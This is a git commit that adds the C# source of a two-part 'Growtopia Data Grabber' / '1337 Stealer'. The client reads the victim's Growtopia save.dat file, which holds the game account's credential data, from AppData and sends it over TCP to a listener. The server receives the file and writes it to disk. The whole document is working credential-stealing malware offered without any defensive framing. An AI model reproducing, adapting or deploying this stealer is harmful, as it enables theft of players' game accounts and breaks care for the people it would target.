5a32c97b9aea20452c9fcbcb5fc72141c4e3c37d
Liab <kanpalaaa@gmail.com>
2019-11-07 11:15:21 +0300

    Updated Page

---
+++ client.cs
@@ -0,0 +1,63 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace client
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //1337 Stealer Client (c) Liab
+            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
+            int port = 1337;
+            int bufferSize = 1024;
+
+            TcpClient client = new TcpClient();
+            NetworkStream netStream;
+
+            // Connect to server
+            try
+            {
+                client.Connect(new IPEndPoint(ipAddress, port));
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+
+            netStream = client.GetStream();
+
+        
+            byte[] data = File.ReadAllBytes("C:\\Users\\" + Environment.UserName  + "\\AppData\\Local\\Growtopia\\save.dat");
+
+            byte[] dataLength = BitConverter.GetBytes(data.Length);
+            byte[] package = new byte[4 + data.Length];
+            dataLength.CopyTo(package, 0);
+            data.CopyTo(package, 4);
+
+            int bytesSent = 0;
+            int bytesLeft = package.Length;
+
+            while (bytesLeft > 0)
+            {
+
+                int nextPacketSize = (bytesLeft > bufferSize) ? bufferSize : bytesLeft;
+
+                netStream.Write(package, bytesSent, nextPacketSize);
+                bytesSent += nextPacketSize;
+                bytesLeft -= nextPacketSize;
+
+            }
+
+            netStream.Close();
+            client.Close();
+        }
+    }
+}
---
+++ server.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace SaveDAT_Grabber
+{
+    class Program
+    {
+   
+        static void Main(string[] args)
+        {
+
+            Console.WriteLine("Growtopia Data Grabber (c) Liab [ALIX] Server");
+            
+            TcpListener listen = new TcpListener(1337);
+            TcpClient client;
+            int bufferSize = 1024;
+            NetworkStream netStream;
+            int bytesRead = 0;
+            int allBytesRead = 0;
+
+         
+            listen.Start();
+
+      
+            client = listen.AcceptTcpClient();
+            netStream = client.GetStream();
+
+     
+            byte[] length = new byte[4];
+            bytesRead = netStream.Read(length, 0, 4);
+            int dataLength = BitConverter.ToInt32(length, 0);
+
+          
+            int bytesLeft = dataLength;
+            byte[] data = new byte[dataLength];
+
+            while (bytesLeft > 0)
+            {
+
+                int nextPacketSize = (bytesLeft > bufferSize) ? bufferSize : bytesLeft;
+
+                bytesRead = netStream.Read(data, allBytesRead, nextPacketSize);
+                allBytesRead += bytesRead;
+                bytesLeft -= bytesRead;
+
+            }
+            var Newname = new System.Random();
+            File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Desktop\\sex" + Newname.Next(1337,666673) + ".txt", data);
+
+            Console.WriteLine("RECEIVE : Growtopia Data Grabbed " + Environment.OSVersion.ServicePack.ToString());
+            // Clean up
+            netStream.Close();
+            client.Close();
+            //Don't touch this stuff or u broke the leet server. if you want udp its faster go change it nub.
+         
+            //Handler for the 1337 leet socked fuck off!
+    
+            Console.BackgroundColor = ConsoleColor.Blue;
+
+            
+   
+                    }
+                
+
+
+
+
+        }
+    }
+
